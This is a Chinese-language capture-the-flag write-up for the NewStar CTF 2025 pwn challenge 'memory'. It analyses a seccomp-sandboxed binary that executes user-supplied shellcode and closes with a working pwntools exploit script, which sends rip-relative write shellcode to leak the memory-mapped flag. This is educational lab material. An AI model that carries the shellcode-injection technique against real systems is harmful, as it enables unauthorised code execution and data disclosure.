---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# memory

打开程序，我们可以看到 main 函数调用了 read_flag 这个函数，随后通过 mprotect 设置了一个段为可读可执行段，最终通过了一些汇编代码

![main 函数调用 read_flag](/assets/images/wp/2025/week4/memory_1.jpg)

进入 `read_flag` 函数可以看到，程序新开了一个段，并在该段中映射 FLAG 内容，相当于 `read`。

![read_flag 映射 FLAG](/assets/images/wp/2025/week4/memory_2.jpg)

随后返回 `main` 函数中先向这个空间内写入了 3 个字节，分别是 72、49、-64，并将我们输入的 `shellcode` 复制在这三个字节之后

此时我们也可以知道，程序调用 `mprotect` 将这个段设置成可读可执行段以执行 shellcode

随后程序进入 install_seccomp 函数设置了沙箱，在这道题目中是个白名单沙箱，程序只允许调用了 write、exit 和 exit_group 三个函数

![seccomp 白名单规则](/assets/images/wp/2025/week4/memory_3.png)

结束设置沙箱后，程序直接使用汇编代码清空寄存器，随后通过 jmp rax 进入 `shellcode` 前 3 字节处（即之前写入的 72、49、-64 处）

![shellcode 前置指令调试](/assets/images/wp/2025/week4/memory_4.jpg)

![寄存器清零后的执行状态](/assets/images/wp/2025/week4/memory_5.jpg)

而 72、49、-64 被解析成了 `xor rax, rax`，执行完后，除了 `rip` 以外所有寄存器全部清零

由于 FLAG 已经在这个段的开头部分，因此只需要通过 `lea` 从 `rip` 的偏移中计算出 FLAG 的绝对地址即可。

`lea rsi, [rip-0x50]` 即可将 `rsi` 设置到 FLAG 地址之前，这样只要经过一次 `write` 就可以将 FLAG 打印出来。

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")

io = remote("127.0.0.1", 11337)
# io = process("src/pwn")
shell = """
mov rax, 1
mov rdi, 1
lea rsi, [rip-0x50]
mov rdx, 0x150
syscall
"""
# shell = shellcraft.sh()
shell = asm(shell)
# gdb.attach(io)
# pause()

io.send(shell)

io.interactive()
```
